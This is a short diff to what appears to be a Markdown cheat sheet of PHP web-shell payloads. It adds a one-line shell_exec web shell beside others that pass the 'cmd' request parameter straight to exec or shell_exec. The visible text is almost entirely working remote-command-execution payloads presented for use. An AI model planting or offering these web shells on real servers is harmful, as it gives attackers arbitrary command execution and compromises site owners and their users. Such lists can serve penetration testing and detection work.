@@ -172,7 +172,11 @@
   ```php
   <?php echo exec($_GET['cmd']); ?>
   ```
-
+  
+  ```php
+  <?php echo shell_exec($_GET['cmd']); ?>
+  ```
+   
   # <kbd>Basic Proportions OK</kbd>
   ```php
   <?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>
